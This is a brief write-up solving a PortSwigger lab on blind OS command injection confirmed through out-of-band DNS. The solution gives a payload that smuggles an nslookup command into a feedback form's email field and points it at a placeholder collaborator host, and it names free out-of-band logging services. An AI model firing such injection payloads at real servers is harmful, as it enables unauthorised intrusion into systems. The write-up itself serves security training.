# Lab 05 — Blind OS command injection with out-of-band interaction

> **Expert** · [Official lab](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)

**Entry point:** `POST /feedback` (`email` field) — blind, but the server

> **Burp Community alternative (free):** Collaborator is Pro-only. Use a free out-of-band service instead — [interact.sh](https://interact.sh) or [canarytokens.org](https://canarytokens.org) give you a unique subdomain with **DNS + HTTP** logging (HTTP-only option: [webhook.site](https://webhook.site)). Substitute its domain wherever this write-up says `YOUR-COLLABORATOR-SUBDOMAIN`.
can make DNS requests. **Tool:** Burp Collaborator.

## Solution

1. Collaborator → *Copy to clipboard*.
2. Inject into `email` (the command runs server-side, asynchronously):

```
email=x||nslookup+x.YOUR-COLLABORATOR-SUBDOMAIN||
```

3. **Poll now** — a DNS interaction from the target confirms the injection —
   lab solved.

## Notes

`nslookup` needs no output channel: the DNS query itself is the signal.
